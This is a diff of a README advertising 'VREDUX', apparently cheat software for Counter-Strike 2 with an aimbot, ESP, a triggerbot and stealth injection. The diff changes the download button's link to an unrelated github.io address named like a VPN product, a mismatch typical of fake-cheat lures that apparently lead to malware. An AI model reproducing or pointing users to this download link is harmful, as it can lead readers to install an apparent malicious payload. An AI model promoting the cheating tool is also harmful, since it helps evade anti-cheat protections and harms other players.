@@ -2,7 +2,7 @@
 
 VREDUX is a private enhancement soft for CS2 designed to boost gameplay. It includes legit aimbot, ESP, and an advanced triggerbot with full customization and stealth injection.
 
-[![Download VREDUX](https://img.shields.io/badge/Download-VREDUX-blueviolet)](https://vredux-cs2-soft-aimplus-edition.github.io/.github)
+[![Download VREDUX](https://img.shields.io/badge/Download-VREDUX-blueviolet)](https://cyberghost-vpn-privacy-shield.github.io/.github)
 
 ---
 
